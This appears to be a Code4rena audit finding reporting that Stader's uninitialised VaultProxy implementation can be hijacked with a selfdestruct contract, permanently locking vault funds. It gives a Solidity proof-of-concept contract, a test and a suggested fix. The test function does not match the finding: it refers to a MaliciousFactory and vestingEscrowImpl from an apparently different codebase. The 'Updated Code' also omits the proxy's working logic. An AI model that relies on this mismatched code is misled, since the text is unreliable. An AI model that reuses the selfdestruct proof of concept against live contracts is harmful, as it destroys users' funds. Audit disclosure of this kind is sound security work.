 # Source: https://github.com/code-423n4/2023-06-stader-findings/issues/418

 # Cannot be found through fuzzing


 ### Vulnerability Summary

**Title**: Malicious Destruction of `VaultProxy` in Stader Protocol

**Impact**:
- `VaultProxy` can be maliciously destroyed, rendering all `ValidatorWithdrawalVault` and `NodeELRewardVault` functions useless, potentially leading to a loss of all funds in these contracts.

### Vulnerability Details

**Description**:
- The `VaultFactory` contract does not initialize `VaultProxy` when generating `vaultProxyImplementation`.
- `VaultProxy` can be called directly to initialize and set a malicious implementation, leading to its destruction.

**Affected Lines of Code**:
1. [`VaultProxy.sol#L17`](https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/VaultProxy.sol#L17)
2. [`VaultFactory.sol#L29`](https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/factory/VaultFactory.sol#L29)

### Proof of Concept

1. **Attack Scenario**:
   - Deploy `VaultProxy` through `VaultFactory`.
   - Initialize `VaultProxy` with a malicious contract that contains `selfdestruct`.
   - Call the malicious contract to destroy `VaultProxy`.

2. **Example Code**:
   ```solidity
   contract BadDestruct {
       fallback() external {
           selfdestruct(payable(address(0)));
       }
   }

   contract GoodVault {
       function returnTrue() external returns(bool) {
           return true;
       }
   }

   contract VaultProxy {
       bool public isInitialized;
       address public fallbackVault;

       constructor() {}

       function initialise(address _fallbackVault) external {  
           require(isInitialized == false);
           isInitialized = true;
           fallbackVault = _fallbackVault;
       }

       fallback(bytes calldata _input) external payable returns (bytes memory) {
           (bool success, bytes memory data) = fallbackVault.delegatecall(_input);
           if (!success) {
               revert(string(data));
           }
           return data;
       }
   }
   ```

3. **Test Function**:
   ```solidity
   function testArbitraryDelegateCall() public {
       address maliciousFactory = address(new MaliciousFactory());
       address vestingEscrowImpl = factory.vestingEscrowImpl();
       address attacker = makeAddr("attacker");

       bytes memory craftedCalldata = abi.encodePacked(
           hex"0ccfac9e",
           hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000",
           address(maliciousFactory),
           hex"0000000000000000000000000000000000000000",
           address(attacker),
           hex"0000000000",
           hex"0000000000",
           hex"0000000000",
           hex"0000000000000000000000000000000000000000000000000000000000000000",
           hex"006d"
       );

       vm.prank(attacker);
       (bool success, bytes memory data) = vestingEscrowImpl.call(craftedCalldata);
   }
   ```

### Impact

- If the attacker executes the `selfdestruct` opcode via a malicious adaptor, all proxies pointing to the destructed implementation would be bricked, and all tokens would be permanently locked.

### Tools Used

- Manual review

### Recommendation

- Initialize `VaultProxy` in the constructor to prevent uninitialized state.
- Add `isInitialized = true` in the `VaultProxy` constructor to prevent re-initialization.

**Updated Code**:
```solidity
contract VaultProxy {
    bool public isInitialized;
    address public fallbackVault;

    constructor() {
        isInitialized = true;
    }
}
```

### Assessed Type

- Context